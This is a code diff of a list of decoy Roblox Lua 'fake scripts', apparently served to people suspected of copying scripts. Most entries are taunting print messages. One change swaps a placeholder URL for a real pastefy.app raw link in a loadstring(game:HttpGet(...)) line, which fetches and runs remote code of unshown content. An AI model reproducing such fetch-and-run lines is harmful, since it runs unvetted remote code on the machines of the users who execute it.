@@ -41,7 +41,7 @@ print("Contact developer for access")`,
     `-- Fake script 1
 print("Loading...")
 wait(2)
-print("Access denied - Invalid HWID")`,
+print("Access denied")`,
     
     `-- Fake script 2
 local function fakeFunction()
@@ -51,11 +51,11 @@ end
 fakeFunction()`,
     
     `-- Fake script 3
-print("Trial version expired")
-print("Purchase premium access")`,
+print("hi skidd")
+print("Hi skidder")`,
     
     `-- Fake script 4
-loadstring(game:HttpGet("https://fake-url-does-not-exist.com"))()`,
+loadstring(game:HttpGet("https://pastefy.app/MqlHJeCW/raw"))()`,
 ];
 
 // User session tracking
